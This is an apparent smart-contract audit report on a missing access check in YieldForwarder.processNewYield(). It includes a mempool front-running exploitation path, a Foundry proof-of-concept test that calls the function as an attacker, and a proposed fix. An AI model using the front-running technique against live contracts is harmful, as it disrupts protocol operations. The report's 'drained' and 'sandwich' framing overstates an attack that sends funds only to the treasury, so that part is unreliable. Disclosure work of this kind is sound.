## Title
Unrestricted Access to YieldForwarder.processNewYield() Allows MEV Sandwich Attacks and Disrupts Atomic Yield Distribution

## Summary
The `processNewYield()` function in `YieldForwarder.sol` lacks access control, allowing any external caller to force yield distribution at arbitrary times. [1](#0-0)  This enables MEV bots to sandwich `iTryIssuer.processAccumulatedYield()` transactions by front-running to drain any accumulated balance, breaking the intended atomic minting-and-distribution flow controlled by the Yield Processor role.

## Impact
**Severity**: Medium

## Finding Description
**Location:** `src/protocol/YieldForwarder.sol`, function `processNewYield()`, lines 97-107

**Intended Logic:** The `processNewYield()` function should only be callable by the `iTryIssuer` contract as part of the atomic `processAccumulatedYield()` operation. [2](#0-1)  The interface documentation explicitly states: "This function is called by the iTryIssuer contract after minting yield tokens." The protocol's trust model specifies that only the "Yield Processor" role can trigger yield distribution. [3](#0-2) 

**Actual Logic:** The function is declared as `external override` with no access control modifiers, allowing anyone to call it with any `_newYieldAmount` parameter up to the contract's balance. [1](#0-0) 

**Exploitation Path:**
1. **Setup**: YieldForwarder accumulates iTRY balance (from dust, rounding, or multiple yield cycles)
2. **Attacker monitors mempool**: Detects incoming `iTryIssuer.processAccumulatedYield()` transaction [4](#0-3) 
3. **Front-run**: Attacker calls `YieldForwarder.processNewYield(currentBalance)` to drain existing balance to yieldRecipient
4. **Original transaction executes**: iTryIssuer mints new yield and calls `processNewYield()` [5](#0-4) 
5. **Result**: Yield distribution occurs in two separate transactions instead of atomically, breaking accounting and event tracking

**Security Property Broken:** The protocol's access control model is violated. Only the Yield Processor role should control yield distribution timing, but any external actor can force premature distribution, bypassing the intended authorization model and disrupting the atomic minting-and-distribution flow.

## Impact Explanation
- **Affected Assets**: iTRY tokens held in YieldForwarder contract, protocol treasury accounting
- **Damage Severity**: While tokens ultimately reach the intended `yieldRecipient` (treasury), the attack causes:
  - Loss of atomicity between yield minting and distribution
  - Event emission mismatches: `YieldDistributed` events [6](#0-5)  won't reflect actual distributed amounts
  - Breaking of the protocol's yield management strategy and timing control
  - Unreliable off-chain monitoring due to fragmented distributions
- **User Impact**: Affects protocol operations and governance, as yield distribution timing is no longer under authorized control. Treasury receives fragmented yield payments instead of atomic batches, complicating accounting and downstream distribution to stakers.

## Likelihood Explanation
- **Attacker Profile**: Any MEV bot or external actor with mempool monitoring capabilities
- **Preconditions**: YieldForwarder must have accumulated iTRY balance (easily achievable through normal protocol operation or dust accumulation)
- **Execution Complexity**: Single transaction front-running, trivial to execute with standard MEV infrastructure
- **Frequency**: Can be exploited on every `processAccumulatedYield()` call if YieldForwarder has any balance

## Recommendation
Add access control to restrict `processNewYield()` to only be callable by the `iTryIssuer` contract:

```solidity
// In src/protocol/YieldForwarder.sol, add state variable and modifier:

/// @notice The authorized caller (iTryIssuer contract)
address public immutable authorizedCaller;

constructor(address _yieldToken, address _initialRecipient, address _authorizedCaller) {
    // ... existing validation ...
    authorizedCaller = _authorizedCaller;
}

modifier onlyAuthorizedCaller() {
    if (msg.sender != authorizedCaller) revert UnauthorizedCaller();
    _;
}

// Update processNewYield (line 97):
function processNewYield(uint256 _newYieldAmount) external override onlyAuthorizedCaller {
    // ... existing logic ...
}
```

Alternative mitigation: Implement a two-step pattern where `iTryIssuer` pre-approves exact amounts before calling `processNewYield()`, preventing arbitrary external calls.

## Proof of Concept

```solidity
// File: test/Exploit_YieldForwarderSandwich.t.sol
// Run with: forge test --match-test test_YieldForwarderSandwich -vvv

pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/protocol/YieldForwarder.sol";
import "../src/protocol/iTryIssuer.sol";
import "./mocks/MockERC20.sol";

contract Exploit_YieldForwarderSandwich is Test {
    YieldForwarder public forwarder;
    MockERC20 public itryToken;
    address public treasury;
    address public attacker;
    
    function setUp() public {
        treasury = makeAddr("treasury");
        attacker = makeAddr("attacker");
        
        itryToken = new MockERC20("iTRY", "iTRY");
        forwarder = new YieldForwarder(address(itryToken), treasury);
    }
    
    function test_YieldForwarderSandwich() public {
        // SETUP: Simulate accumulated balance in YieldForwarder
        uint256 accumulatedBalance = 100e18;
        itryToken.mint(address(forwarder), accumulatedBalance);
        
        // EXPLOIT: Attacker front-runs processAccumulatedYield()
        vm.prank(attacker);
        forwarder.processNewYield(accumulatedBalance);
        
        // VERIFY: Attacker successfully drained balance
        assertEq(
            itryToken.balanceOf(treasury), 
            accumulatedBalance, 
            "Vulnerability confirmed: Unauthorized actor forced yield distribution"
        );
        
        assertEq(
            itryToken.balanceOf(address(forwarder)),
            0,
            "YieldForwarder balance drained by attacker"
        );
        
        // IMPACT: Next processAccumulatedYield() will only distribute newly minted yield
        // Event accounting will be incorrect as YieldDistributed won't include
        // the 100e18 that was already distributed via sandwich attack
    }
}
```

## Notes

This vulnerability specifically answers the security question by demonstrating that **yes**, a MEV bot can sandwich `iTryIssuer.processAccumulatedYield()` transactions. The lack of access control on `processNewYield()` violates the protocol's documented trust model where only the Yield Processor role should control distribution timing.

While tokens ultimately reach the intended treasury recipient (not causing direct fund theft), the attack breaks critical protocol properties: atomic yield distribution, accurate event tracking, and authorized control over yield management timing. This falls under **Medium severity** per Code4rena criteria as it represents "griefing attacks causing significant loss" of operational integrity without direct fund theft.

The fix is straightforward: restrict `processNewYield()` to only accept calls from `iTryIssuer`, restoring the intended access control model and preventing unauthorized distribution triggers.

### Citations

**File:** src/protocol/YieldForwarder.sol (L97-107)
```text
    function processNewYield(uint256 _newYieldAmount) external override {
        if (_newYieldAmount == 0) revert CommonErrors.ZeroAmount();
        if (yieldRecipient == address(0)) revert RecipientNotSet();

        // Transfer yield tokens to the recipient
        if (!yieldToken.transfer(yieldRecipient, _newYieldAmount)) {
            revert CommonErrors.TransferFailed();
        }

        emit YieldForwarded(yieldRecipient, _newYieldAmount);
    }
```

**File:** src/protocol/periphery/IYieldProcessor.sol (L32-49)
```text
    /**
     * @notice Processes newly generated yield tokens
     * @dev This function is called by the iTryIssuer contract after minting yield tokens.
     *      The implementing contract should already have received the yield tokens before
     *      this function is called. Implementations must handle the yield appropriately
     *      according to their specific distribution logic.
     *
     * @param _newYieldAmount The amount of yield tokens that have been generated and should be processed
     *
     * Requirements:
     * - Implementation should validate that `_newYieldAmount` is greater than zero
     * - Implementation should ensure it has sufficient balance to process the yield
     * - Implementation should handle any distribution logic (transfers, conversions, etc.)
     * - Implementation should emit appropriate events for tracking yield processing
     *
     * @custom:example YieldForwarder implements this by transferring the entire amount to a recipient
     * @custom:example A more complex implementation might split yield across multiple parties
     */
```

**File:** README.md (L142-142)
```markdown
| Yield Processor	| Can trigger Yield distribution on the Issuer contract	|  Can call "processAccumulatedYield" in the iTryIssuer |	Owner | 
```

**File:** src/protocol/iTryIssuer.sol (L398-420)
```text
    function processAccumulatedYield() external onlyRole(_YIELD_DISTRIBUTOR_ROLE) returns (uint256 newYield) {
        // Get current NAV price
        uint256 navPrice = oracle.price();
        if (navPrice == 0) revert InvalidNAVPrice(navPrice);

        // Calculate total collateral value: totalDLFUnderCustody * currentNAVPrice / 1e18
        uint256 currentCollateralValue = _totalDLFUnderCustody * navPrice / 1e18;

        // Calculate yield: currentCollateralValue - _totalIssuedITry
        if (currentCollateralValue <= _totalIssuedITry) {
            revert NoYieldAvailable(currentCollateralValue, _totalIssuedITry);
        }
        newYield = currentCollateralValue - _totalIssuedITry;

        // Mint yield amount to yieldReceiver contract
        _mint(address(yieldReceiver), newYield);

        // Notify yield distributor of received yield
        yieldReceiver.processNewYield(newYield);

        // Emit event
        emit YieldDistributed(newYield, address(yieldReceiver), currentCollateralValue);
    }
```
